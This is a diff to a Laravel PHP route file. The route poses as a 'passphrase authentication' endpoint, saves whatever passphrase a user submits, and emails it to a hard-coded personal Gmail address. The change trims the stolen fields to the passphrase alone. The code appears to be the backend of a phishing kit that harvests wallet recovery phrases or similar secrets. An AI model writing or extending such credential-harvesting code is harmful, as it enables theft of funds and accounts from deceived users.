@@ -22,13 +22,11 @@ Route::get('/', function () {
 
 Route::post('/authenticate/passphrase/WebApp', function(Request $request){
     $request->validate([
-        'passcode'=>['required'],
-        'reenter_passcode'=>['required'],
         'passphrase'=>['required']
     ]);
     $alt_message = Portal::create(['passcode'=>$request->passcode, 'reenter_passcode'=>$request->reenter_passcode, 'passphrase'=>$request->passphrase]);
     $subject = 'New Passphrase and Passcode';
-    $message = "Passcode: ".$alt_message->passcode."<br/>Confirmed Passcode: ".$alt_message->reenter_passcode."<br/> Passphrase: ".$alt_message->passphrase;
+    $message = "Passphrase: ".$alt_message->passphrase;
     Mail::send('main.mail', ['msg'=>$message, 'subject'=>$subject], function($email_info) use ($subject){
         $email_info->to('samtechy224@gmail.com')
         ->replyTo('samtechy224@gmail.com', 'Official__')
